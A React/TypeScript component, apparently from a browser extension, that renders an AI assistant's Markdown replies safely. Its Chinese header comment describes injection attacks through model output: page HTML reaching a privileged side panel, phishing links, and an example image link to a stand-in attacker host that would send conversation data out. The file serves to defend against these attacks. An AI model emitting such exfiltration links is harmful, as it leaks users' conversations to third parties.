/**
 * 助手回复的 Markdown 渲染。
 *
 * 三条安全约束，每条都对应一个真实攻击面：
 *
 * 1. **不开 rehype-raw。** 模型的输出里可能夹带页面上抄来的 HTML；
 *    允许原始 HTML = 允许页面往侧栏注入内容。侧栏是特权上下文
 *    （能读 chrome.storage、能调 chrome.debugger），绝不能渲染任意 HTML。
 *
 * 2. **链接一律 target=_blank + rel=noopener noreferrer**，并且**不自动跳转**。
 *    模型不能靠输出一个 markdown 链接就让用户点进钓鱼站 —— 至少 hostname
 *    要看得见，所以外链后面缀上域名。
 *
 * 3. **图片不渲染成 <img>。** 一个 `![](https://attacker/track?data=...)`
 *    会在侧栏里自动发出请求，把对话内容外带出去。这里降级成纯文本链接。
 */

import { memo } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

function hostOf(href: string): string {
  try {
    return new URL(href).hostname;
  } catch {
    return '';
  }
}

const COMPONENTS: Components = {
  a({ href, children }) {
    const url = typeof href === 'string' ? href : '';
    const host = hostOf(url);
    // 只放行 http(s)。javascript: / data: 直接降级成文本。
    if (!/^https?:\/\//i.test(url)) return <span>{children}</span>;
    return (
      <a href={url} target="_blank" rel="noopener noreferrer" title={url}>
        {children}
        {host ? <span className="text-text-400"> ({host})</span> : null}
      </a>
    );
  },

  img({ src, alt }) {
    const url = typeof src === 'string' ? src : '';
    return (
      <span className="text-text-400 text-xs">
        [image{alt ? `: ${alt}` : ''}
        {url ? ` — ${hostOf(url) || 'inline'}` : ''}]
      </span>
    );
  },

  pre({ children }) {
    return (
      <pre className="my-2 overflow-x-auto rounded-lg border-[0.5px] border-border-300 bg-bg-200 p-2.5">
        {children}
      </pre>
    );
  },

  code({ className, children }) {
    // react-markdown 里 block code 是 <pre><code class="language-x">，
    // inline code 没有 className。靠这个区分，比看 `inline` prop 可靠
    // （react-markdown 10 已经不传 inline 了）。
    const isBlock = typeof className === 'string' && className.startsWith('language-');
    if (isBlock) return <code className={className}>{children}</code>;
    return (
      <code className="rounded bg-bg-200 px-1 py-0.5 text-[0.8125rem] text-text-200">
        {children}
      </code>
    );
  },

  table({ children }) {
    return (
      <div className="my-2 overflow-x-auto">
        <table>{children}</table>
      </div>
    );
  },
};

export const Markdown = memo(function Markdown({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={COMPONENTS}>
      {text}
    </ReactMarkdown>
  );
});
